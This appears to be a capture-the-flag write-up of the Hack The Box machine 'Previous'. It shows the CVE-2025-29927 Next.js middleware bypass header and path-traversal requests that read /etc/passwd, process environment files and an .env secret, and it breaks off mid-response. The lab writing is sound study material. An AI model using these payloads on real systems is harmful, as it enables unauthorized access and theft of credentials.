---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - CVE-2025-29927
  - Nextjs
  - AuthenticationBypass
  - LocalFileInclusion
  - LFI
  - Terraform
---

![](images/Previous.png)

## Table of Contents

- [Summary](#summary)
- [Reconnaissance](#reconnaissance)
  - [Port Scanning](#port-scanning)
  - [Enumeration of Port 80/TCP](#enumeration-of-port-80tcp)
  - [Directory Busting](#directory-busting)
- [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
- [Foothold](#foothold)
  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
- [user.txt](#usertxt)
- [Enumeration](#enumeration)
- [Privilege Escalation to root](#privilege-escalation-to-root)
  - [Terraform Misconfiguration](#terraform-misconfiguration)
- [Post Exploitation](#post-exploitation)

## Summary

The first steps of this box are build around `CVE-2025-29927` which describes an `Authentication Bypass` in `Next.js` by adding a custom `HTTP Header` so called `X-Middleware-Subrequest: middleware`.

The successful execution of the `Authentication Bypass` leads to a `Local File Inclusion (LFI)` vulnerability. This allows to enumerate the containerized web application and `exfiltrate` a `username` and `password` out of the `[...nextauth].js` file to achieve `Foothold` on the box.

After obtaining the `user.txt` the `Privilege Escalation` to `root` requires to abuse a `misconfiguration` of given `capabilities` using `sudo` and `Terraform`. With a malicious `examples files` and a modified `configuration file` it is possible to `execute commands` as `root` and to get access to the `root.txt`.

## Reconnaissance

### Port Scanning

As usual we started with a initial `port scan` using `Nmap` and discovered port `22/TCP` as well as port `80/TCP` to be open.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.214.193 --min-rate 10000 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 21:02 CEST
Nmap scan report for 10.129.214.193
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

On port `80/TCP` we figured out a `redirect` to `previous.htb` which we added to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,80 10.129.214.193 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 21:02 CEST
Nmap scan report for 10.129.214.193
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.193  previous.htb
```

### Enumeration of Port 80/TCP

While we investigated what the website had to offer, we took a look at the `tech stack` and spotted `Next.js` in the `headers`.

- [http://previous.htb/](http://previous.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://previous.htb/
http://previous.htb/ [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.214.193], Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]
```

The page offered very little options for us do to things.

![](images/2025-08-23_21-06_80_website.png)

### Directory Busting

To not miss out on any useful files and to enlarge the attack surface, we performed `directory busting` which resulted in a lot of `redirects` for the `/api` endpoint.

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://previous.htb/

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_previous.htb/__25-08-23_21-05-50.txt

Target: http://previous.htb/

[21:05:50] Starting:                                                             
[21:06:08] 307 -   39B  - /api-doc  ->  /api/auth/signin?callbackUrl=%2Fapi-doc
[21:06:08] 307 -   35B  - /api  ->  /api/auth/signin?callbackUrl=%2Fapi
[21:06:08] 307 -   40B  - /api-docs  ->  /api/auth/signin?callbackUrl=%2Fapi-docs
[21:06:08] 307 -   60B  - /api/2/issue/createmeta  ->  /api/auth/signin?callbackUrl=%2Fapi%2F2%2Fissue%2Fcreatemeta
[21:06:08] 307 -   41B  - /api/api  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapi
[21:06:08] 307 -   39B  - /api.log  ->  /api/auth/signin?callbackUrl=%2Fapi.log
[21:06:08] 307 -   38B  - /api.py  ->  /api/auth/signin?callbackUrl=%2Fapi.py
[21:06:08] 307 -   45B  - /api/apidocs  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapidocs
[21:06:08] 307 -   39B  - /api.php  ->  /api/auth/signin?callbackUrl=%2Fapi.php
[21:06:08] 307 -   52B  - /api/cask/graphql  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fcask%2Fgraphql
[21:06:08] 307 -   46B  - /api/api-docs  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapi-docs
[21:06:08] 307 -   54B  - /api/application.wadl  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapplication.wadl
[21:06:08] 307 -   60B  - /api/apidocs/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapidocs%2Fswagger.json
[21:06:08] 307 -   47B  - /api/error_log  ->  /api/auth/signin?callbackUrl=%2Fapi%2Ferror_log
[21:06:08] 307 -   48B  - /api/index.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Findex.html
[21:06:08] 307 -   44B  - /api/jsonws  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fjsonws
[21:06:08] 307 -   42B  - /api/docs  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fdocs
[21:06:08] 307 -   43B  - /api/batch  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fbatch
[21:06:08] 307 -   44B  - /api/config  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fconfig
[21:06:08] 307 -   48B  - /api/login.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Flogin.json
[21:06:08] 307 -   53B  - /api/jsonws/invoke  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fjsonws%2Finvoke
[21:06:08] 307 -   73B  - /api/package_search/v4/documentation  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fpackage_search%2Fv4%2Fdocumentation
[21:06:08] 307 -   53B  - /api/swagger-ui.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger-ui.html
[21:06:08] 307 -   58B  - /api/swagger/ui/index  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Fui%2Findex
[21:06:08] 307 -   50B  - /api/swagger.yaml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger.yaml
[21:06:08] 307 -   67B  - /api/swagger/static/index.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Fstatic%2Findex.html
[21:06:08] 307 -   49B  - /api/swagger.yml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger.yml
[21:06:08] 307 -   43B  - /api/proxy  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fproxy
[21:06:08] 307 -   50B  - /api/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger.json
[21:06:08] 307 -   57B  - /api/spec/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fspec%2Fswagger.json
[21:06:08] 307 -   55B  - /api/swagger/swagger  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Fswagger
[21:06:08] 307 -   58B  - /api/swagger/index.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Findex.html
[21:06:08] 307 -   45B  - /api/profile  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fprofile
[21:06:08] 307 -   45B  - /api/swagger  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger
[21:06:08] 307 -   47B  - /api/snapshots  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fsnapshots
[21:06:08] 307 -   40B  - /api/v1  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv1
[21:06:08] 307 -   55B  - /api/v1/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv1%2Fswagger.json
[21:06:08] 307 -   52B  - /api/timelion/run  ->  /api/auth/signin?callbackUrl=%2Fapi%2Ftimelion%2Frun
[21:06:08] 307 -   55B  - /api/v2/swagger.yaml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2%2Fswagger.yaml
[21:06:08] 307 -   55B  - /api/v2/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2%2Fswagger.json
[21:06:08] 307 -   62B  - /api/v2/helpdesk/discover  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2%2Fhelpdesk%2Fdiscover
[21:06:08] 307 -   55B  - /api/v1/swagger.yaml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv1%2Fswagger.yaml
[21:06:08] 307 -   40B  - /api/v2  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2
[21:06:08] 307 -   57B  - /apiserver-aggregator.cert  ->  /api/auth/signin?callbackUrl=%2Fapiserver-aggregator.cert
[21:06:08] 307 -   52B  - /apiserver-client.crt  ->  /api/auth/signin?callbackUrl=%2Fapiserver-client.crt
[21:06:08] 307 -   45B  - /api/version  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fversion
[21:06:08] 307 -   39B  - /apidocs  ->  /api/auth/signin?callbackUrl=%2Fapidocs
[21:06:08] 307 -   40B  - /api/v3  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv3
[21:06:08] 307 -   56B  - /apiserver-aggregator.key  ->  /api/auth/signin?callbackUrl=%2Fapiserver-aggregator.key
[21:06:08] 307 -   60B  - /apiserver-aggregator-ca.cert  ->  /api/auth/signin?callbackUrl=%2Fapiserver-aggregator-ca.cert
[21:06:08] 307 -   38B  - /apidoc  ->  /api/auth/signin?callbackUrl=%2Fapidoc
[21:06:08] 307 -   44B  - /api/whoami  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fwhoami
[21:06:08] 307 -   74B  - /api/vendor/phpunit/phpunit/phpunit  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fvendor%2Fphpunit%2Fphpunit%2Fphpunit
[21:06:08] 307 -   36B  - /apis  ->  /api/auth/signin?callbackUrl=%2Fapis
[21:06:08] 307 -   40B  - /api/v4  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv4
[21:06:08] 307 -   49B  - /apiserver-key.pem  ->  /api/auth/signin?callbackUrl=%2Fapiserver-key.pem
[21:06:08] 307 -   44B  - /apibuild.pyc  ->  /api/auth/signin?callbackUrl=%2Fapibuild.pyc
[21:06:10] 308 -   19B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp     
[21:06:10] 308 -   24B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[21:06:10] 308 -   30B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[21:06:13] 308 -   52B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[21:06:17] 307 -   36B  - /docs  ->  /api/auth/signin?callbackUrl=%2Fdocs   
[21:06:17] 307 -   41B  - /docs.json  ->  /api/auth/signin?callbackUrl=%2Fdocs.json
[21:06:17] 307 -   52B  - /docs/changelog.txt  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fchangelog.txt
[21:06:17] 307 -   53B  - /docs/CHANGELOG.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2FCHANGELOG.html
[21:06:17] 307 -   54B  - /docs/export-demo.xml  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fexport-demo.xml
[21:06:17] 307 -   63B  - /docs/html/admin/ch01.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Fch01.html
[21:06:17] 307 -   64B  - /docs/html/admin/index.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Findex.html
[21:06:17] 307 -   66B  - /docs/html/admin/ch01s04.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Fch01s04.html
[21:06:17] 307 -   70B  - /docs/html/developer/ch03s15.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fdeveloper%2Fch03s15.html
[21:06:17] 307 -   66B  - /docs/html/admin/ch03s07.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Fch03s07.html
[21:06:17] 307 -   67B  - /docs/html/developer/ch02.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fdeveloper%2Fch02.html
[21:06:17] 307 -   51B  - /docs/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fswagger.json
[21:06:17] 307 -   51B  - /docs/updating.txt  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fupdating.txt
[21:06:17] 307 -   38B  - /docs51  ->  /api/auth/signin?callbackUrl=%2Fdocs51
[21:06:17] 307 -   56B  - /docs/html/index.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Findex.html
[21:06:17] 307 -   54B  - /docs/maintenance.txt  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fmaintenance.txt
[21:06:18] 308 -   39B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[21:06:18] 308 -   42B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[21:06:19] 308 -   27B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[21:06:21] 308 -   37B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[21:06:36] 200 -    3KB - /signin                                           
                                                                             
Task Completed
```

On `/signin` we got greeted by a `login page` to a `closed beta` program.

![](images/2025-08-23_21-09_80_website_signin.png)

We `intercepted` a random `login attempt` using `Burp Suite` to take a closer look at the actual `HTTP request`. Interesting for us was the `callbackUrl` parameter trying to access `/docs` on port `3000/TCP` locally.

**Request**

```shell
GET /api/auth/providers HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```shell
HTTP/1.1 304 Not Modified
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:10:39 GMT
Content-Type: application/json
Connection: keep-alive
ETag: "qsia4r7in25u"
Vary: Accept-Encoding


```

To complete our first attempt to gather as much information as we could we also spotted a `username` on the `Contact` button of the main page.

- [view-source:http://previous.htb/](view-source:http://previous.htb/)

```shell
<a href="[mailto:jeremy@previous.htb](mailto:jeremy@previous.htb)" class="text-gray-500 hover:text-gray-900">Contact</a>
```

| Username |
| -------- |
| jeremy   |

## CVE-2025-29927: Next.js Authentication Bypass

Now we headed back to the `Next.js` part of the tech stack and knowing that there was a recently discovered `Authentication Bypass` aka `CVE-2025-29927` by adding the `X-Middleware-Subrequest` header, we went straight for that.

- [https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)

First we tried to `bypass authentication` by `intercepting`, `modifying` and `forwarding` the `login request` with the first known payload.

**Payload**

```shell
X-Middleware-Subrequest: middleware
```

**Request**

```shell
GET /api/auth/signin HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```shell
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:16:10 GMT
Connection: keep-alive
Location: /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Content-Length: 0


```

**Request**

```shell
GET /api/auth/session HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:17:26 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 2
Connection: keep-alive
ETag: "bwc9mymkdm2"
Vary: Accept-Encoding

{}
```

Unfortunately that didn't lead us anywhere. We did a bit more research and found the following article which described `chaining` the payload `back to back` separated by `:`.

- [https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/)

**Payload**

```shell
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

And this time it actually worked on `/docs` which granted us access to the `dashboard` (even that there ware basically no information at all). So we had a working payload.

**Request**

```shell
GET /docs HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

![](images/2025-08-23_21-31_80_authentication_bypass.png)

## Foothold
### Local File Inclusion (LFI)

With access to the web application we tried different `endpoints` like `/api/download` and `rendered` the `response` within `Burp Suite`.

**Request**

```shell
GET /api/download HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

The `/api/download` endpoint responded with a very useful `error message` saying that it expected a valid `filename`.

**Response**

```shell
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:35:08 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
Connection: keep-alive
ETag: "vpkl9mnjvgs"
Vary: Accept-Encoding

{"error":"Invalid filename"}
```

First we tried to directly access `/etc/passwd` which did not worked. Then we slowly moved up the directories by adding `../` to our `GET request` until we got a hit. Textbook like `Local File Inclusion (LFI)`.

**Request**

```shell
GET /api/download?example=../../../../../etc/passwd HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:26:44 GMT
Content-Type: application/zip
Content-Length: 787
Connection: keep-alive
Content-Disposition: attachment; filename=../../../../../etc/passwd
ETag: "41amqg1v4m26j"

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin

```

The content of `/etc/passwd` delivered us another `username` which let us assume that the application was `containerized`.

| Username |
| -------- |
| node     |

Now our very time consuming journey of enumeration through the `LFI` started. We slowly progressed through each of the low-hanging fruits like `/proc/self/environ` to get a better picture of the structure of the application.

**Request**

```shell
GET /api/download?example=../../../../../proc/self/environ HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

The actual `response` showed us the `working directory` which was `/app` and the `environment` of `production`.

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:40:52 GMT
Content-Type: application/zip
Content-Length: 216
Connection: keep-alive
Content-Disposition: attachment; filename=../../../../../proc/self/environ
ETag: "151dqoq1n56jy"

NODE_VERSION=18.20.8 HOSTNAME=0.0.0.0 YARN_VERSION=1.22.22 SHLVL=1 PORT=3000 HOME=/home/nextjs PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NEXT_TELEMETRY_DISABLED=1 PWD=/app NODE_ENV=production
```

Then we went for the `/proc/self/cmdline` to see if we could get a bit more out of it but that was not the case.

**Request**

```shell
GET /api/download?example=../../../../../proc/self/cmdline HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:42:04 GMT
Content-Type: application/zip
Content-Length: 15
Connection: keep-alive
Content-Disposition: attachment; filename=../../../../../proc/self/cmdline
ETag: "kbthnbes5729"

next-server (v
```

With the information for the `environment` values we targeted `.env` inside `/app`. To do so we slowly moved up again by adding `../` until we hit `/app` and the `.env` file.

**Request**

```shell
GET /api/download?example=../../../app/.env HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=bd1ade39e7ce4e9385f13999b9323d1b22f0701fd6eb7e1ec16a64cbbc2a1169%7C627b366c1c4ae2c22cd7843884dcd8691cd103886c7b8ae1f3f60477fc0e68e4; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

Unfortunately it only contained the `NEXTAUTH_SECRET` which we assumed based on the authentication bypass, would led us to and empty page once more if we would be able to forge a cookie out of it.

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 19:43:43 GMT
Content-Type: application/zip
Content-Length: 49
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/.env
ETag: "14ro7p5qyfd4v"

NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a

```

But now we knew the path for the `/app` directory and tried default `Next.js` files like `server.js`.

**Request**

```shell
GET /api/download?example=../../../app/server.js HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2F10%2e10%2e16%2e36%3A3000%2Fdocs
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzU1OTc4Mzk3LCJleHAiOjE3NTU5ODE5OTd9.clE3kgymdfxvgie2n1uSKCctcG281oHwMbQReY9Nc1I; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
If-None-Match: "qsia4r7in25u"
Connection: keep-alive


```

And that resulted in a lot of useful information about the instance itself.

**Response**

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 23 Aug 2025 20:18:51 GMT
